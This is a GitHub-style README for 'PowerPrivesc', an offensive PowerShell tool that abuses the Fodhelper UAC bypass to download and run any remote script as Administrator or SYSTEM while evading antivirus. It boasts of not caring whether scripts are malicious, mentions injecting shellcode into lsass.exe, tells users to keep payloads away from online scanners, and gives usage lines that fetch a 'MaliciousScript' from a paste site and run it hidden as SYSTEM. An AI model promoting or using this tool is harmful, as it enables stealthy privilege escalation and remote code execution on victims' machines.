# PowerPrivesc - Your AIO FUD Powershell Privesc Tool
Your all-in-one Powershell privilege escalation tool to run ANY script from a webserver.
You heard it right,ANYTHING! Wether its malicious or not,WE DONT CARE! ;)

The privilige escalation method that this tool used is the same one with the one that used on [MeterPwrShell](https://github.com/GetRektBoy724/MeterPwrShell).
This tool literally can run any script you want,from a normal copy-paste file to injecting shellcode into lsass.exe.
Dont forget to host the script somewhere! (my own recommendation is paste.c-net.org),
And also,dont even worry of your script is getting caught by AVs,we take care of the AV Evasion and Bypass ;)
# Notes
- NEVER UPLOAD THE PAYLOAD THAT GENERATED BY THIS PROGRAM TO ANY ONLINE SCANNER
- NEVER USE THIS PROGRAM FOR MALICIOUS PURPOSE
- SPREADING THE PAYLOAD THAT GENERATED BY THIS PROGRAM IS NOT COOL
- ANY DAMAGE GENERATED BY THIS PROGRAM IS NOT MY (As the program maker) RESPONSIBILTY!!!
- THIS TOOL DOESNT SCAN FOR PRIVESC VULNS,BUT ACTUALLY EXPLOIT A VULNERABILITY THAT WORKS AND UNPATCHED ON ALL WINDOWS 10 (which is Fodhelper Privesc Vulnerability)
- If you have some feature recommendation,post that on Issue
- If you have some issue with the program,try redownloading it again (trust me),cause sometimes i edit the release and fix it without telling 😂
- If you want to know how tf my tool can bypass any AVs,you can check on [this](https://gist.github.com/GetRektBoy724/9383c9580cb1c9935fc04cc7eb7ef004) and [this](https://blog.sevagas.com/Bypass-Antivirus-Dynamic-Analysis)
### This Script Is Tested on Windows 10 v20H2
# Thanks to
- @FuzzySec for that awesome Masquerade PEB script
- @decoder-it for that amazing PPID Spoofing script
- Me for not dying when creating this tool
- Ed Wilson AKA Microsoft Scripting Guy for the great Powershell scripting tutorials
- and the last one is Emeric Nasi for the [research on bypassing AV dynamics](https://blog.sevagas.com/IMG/pdf/BypassAVDynamics.pdf)
# Requirements
- Internet Connection (On The Computer Where You Use This Script)
# Usage
```
PARAMETER ScriptLink
The link that goes into the script
PARAMETER ToPrivilege
The privilege you want,it can be Administrator or SYSTEM
SWITCH HideWindow
Use the switch to hide Powershell windows,By default,this tool shows the window
EXAMPLE
Invoke-PowerPrivesc -ScriptLink https://paste.c-net.org/MaliciousScript -ToPrivilege SYSTEM -HideWindow
Description
-----------
Run the Script as SYSTEM with window hidden
EXAMPLE
Invoke-PowerPrivesc -ScriptLink https://paste.c-net.org/MaliciousScript -ToPrivilege Administrator
Description
-----------
Run the Script as Administrator with window not hidden
```
 # To-do List
- Fix -HideWindows switch
